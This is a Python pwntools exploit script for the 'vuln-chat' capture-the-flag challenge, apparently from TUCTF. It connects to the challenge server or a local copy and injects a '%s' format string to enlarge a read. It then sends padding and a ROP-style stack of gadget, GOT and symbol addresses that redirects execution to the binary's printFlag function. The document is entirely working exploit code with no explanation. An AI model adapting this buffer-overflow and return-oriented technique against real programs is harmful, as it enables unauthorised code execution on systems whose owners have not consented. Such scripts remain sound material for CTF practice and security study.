#!/usr/bin/python
# encoding: utf-8
from  pwn import *
context.clear(arch='i386')

import time
import sys
binaire='vuln-chat'

if (len(sys.argv)>1):
    TIME=0.0
    elf=ELF(binaire)
    libc=ELF('/opt/libc-database-master/db/libc6-i386_2.19-18+deb8u2_amd64.so')
    host='vulnchat.tuctf.com'
    port=4141

else:
    TIME=0.0
    elf=ELF(binaire)
    libc=ELF('libc.so.6')
    host='localhost'
    port=59994


p=remote(host,port)

p.recvuntil("name: ")
p.sendline("ABCDEFGHIJKLMNOPQRST%s")
p.recvuntil("%s: ")
pop1=0x080483c1 # : pop ebx ; ret
PAD="ABCDEFGHIJKLMNOPQRSTUVWXYZ@@AABBCCDDEEFFGGHHI"

pile=p32(0x804b580)+p32(elf.sym['printFlag'])+p32(pop1)+p32(elf.got['fflush'])+p32(pop1)+p32(elf.sym['stdout'])
p.sendline(PAD+pile)
print p.recvall(2)
exit(0)
